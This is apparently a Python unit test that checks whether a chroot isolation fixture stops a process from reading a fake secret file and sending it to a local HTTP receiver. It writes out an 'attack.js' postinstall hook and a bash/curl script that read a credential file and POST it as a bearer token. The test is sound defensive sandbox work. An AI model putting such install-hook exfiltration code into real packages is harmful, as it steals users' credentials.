import http.server
import importlib.util
import json
import os
from pathlib import Path
import secrets
import tempfile
import threading
import unittest


class CausalFixture(unittest.TestCase):
    def test_actual_shell_can_read_and_use_fake_material_only_in_control(self):
        if os.getuid() != 0:
            self.skipTest("local synthetic chroot control requires existing root/CAP_SYS_CHROOT; deployed proof remains owed")
        spec = importlib.util.spec_from_file_location("fixture", Path(__file__).with_name("isolation-fixture.py"))
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        effects = []
        fake = secrets.token_hex(24)
        class Receiver(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                authorized = self.headers.get("Authorization") == "Bearer " + fake
                effects.append({"authorized": authorized, "actor": self.headers.get("X-Boss-User")})
                self.send_response(204 if authorized else 401)
                self.end_headers()
            def log_message(self, *_):
                pass
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Receiver)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            with tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                root.chmod(0o755)
                secret = root / "fake-control-secret"
                secret.write_text(fake)
                secret.chmod(0o644)  # UID alone cannot explain the refusal.
                script = """const fs = require('fs');
let material = 'absent'; let read = false;
try { material = fs.readFileSync(process.env.FAKE_PATH, 'utf8'); read = true; } catch {}
const response = await fetch(process.env.FAKE_URL, {method:'POST', headers:{Authorization:'Bearer '+material, 'X-Boss-User':'agent-codex'}});
console.log(JSON.stringify({read, status:response.status}));
"""
                jail = root / "jail"
                jail.mkdir(mode=0o755)
                work = jail / "work"
                work.mkdir(mode=0o777)
                work.chmod(0o777)
                (work / "attack.js").write_text(script)
                (work / "package.json").write_text(json.dumps({"name":"causal-fixture", "scripts":{"postinstall":"bun attack.js"}, "trustedDependencies":["causal-fixture"]}))
                (work / "attack.js").chmod(0o644)
                (work / "package.json").chmod(0o644)
                module.copy_tool(jail, "/usr/local/bin/bun")
                module.copy_tool(jail, "/bin/bash")
                module.copy_tool(jail, "/usr/bin/curl")
                env = {"PATH":"/usr/local/bin:/bin", "HOME":"/work", "TMPDIR":"/work", "FAKE_PATH":str(secret), "FAKE_URL":"http://127.0.0.1:" + str(server.server_port)}
                script = '''read=false; material=absent
if [[ -r "$FAKE_PATH" ]]; then read=true; material=$(<"$FAKE_PATH"); fi
umask 077
printf 'Authorization: Bearer %s\\n' "$material" > "$PWD/.fixture-auth"
trap 'rm -f "$PWD/.fixture-auth"' EXIT
status=$(/usr/bin/curl --silent --show-error --output /work/response --write-out '%{http_code}' --request POST --header "@$PWD/.fixture-auth" --header 'X-Boss-User: agent-codex' "$FAKE_URL")
printf '{"read":%s,"status":%s}\\n' "$read" "$status"
'''
                argv = ["/bin/bash", "-c", script]
                control = module.candidate(argv, env, work)
                self.assertEqual(control.returncode, 0, control.stderr)
                self.assertIn(b'"read":true', control.stdout)
                self.assertIn(b'"status":204', control.stdout)
                isolated = module.candidate(argv, env, work, jail=jail)
                self.assertEqual(isolated.returncode, 0, isolated.stderr)
                self.assertIn(b'"read":false', isolated.stdout)
                self.assertIn(b'"status":401', isolated.stdout)
                self.assertEqual(effects, [{"authorized":True,"actor":"agent-codex"}, {"authorized":False,"actor":"agent-codex"}])
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=2)


if __name__ == "__main__":
    unittest.main()
